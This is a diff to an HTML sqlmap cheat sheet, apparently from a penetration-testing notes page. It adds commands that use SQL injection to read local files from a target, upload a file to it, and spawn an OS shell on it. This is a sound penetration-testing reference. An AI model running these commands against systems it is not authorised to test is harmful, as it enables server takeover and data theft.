@@ -200,6 +200,15 @@ sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <
 <span class="c"># use HTTP parameter pollution, splitting payloads between</span>
 <span class="c"># duplicated parameters like /?id=UNION&amp;id=SELECT etc:</span>
 sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--hpp</span>
+
+<span class="c"># if --is-dba reports true, read local files:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--file-read</span> <span class="s2">"&lt;filename&gt;"</span>
+
+<span class="c"># attempt to write file from our machine on target:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--file-write</span> <span class="s2">"&lt;file path&gt;"</span> <span class="nt">--file-dest</span> <span class="s2">"&lt;target path for upload&gt;"</span>
+
+<span class="c"># attempt to spawn a shell on target:</span>
+sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target URL&gt;"</span> <span class="nt">--os-shell</span>
 </code></pre></div>
 
 <h2>specific tuning</h2>
